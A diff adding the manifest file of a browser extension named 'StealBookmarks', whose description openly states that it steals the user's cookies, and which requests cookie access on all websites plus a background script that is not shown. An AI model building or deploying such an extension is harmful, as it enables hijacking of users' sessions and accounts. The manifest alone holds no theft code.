@@ -1,0 +1,17 @@
+{
+    "manifest_version": 2,
+    "version": "1.0",
+	
+    "name": "StealBookmarks",
+    "description": "Extension that steals the user's cookies from the browser" ,
+
+	"background" : {
+		"scripts": ["background.js"]
+	},
+
+	"permissions" : [
+		"cookies",
+		"http://*/*",
+		"https://*/*"
+	]
+}
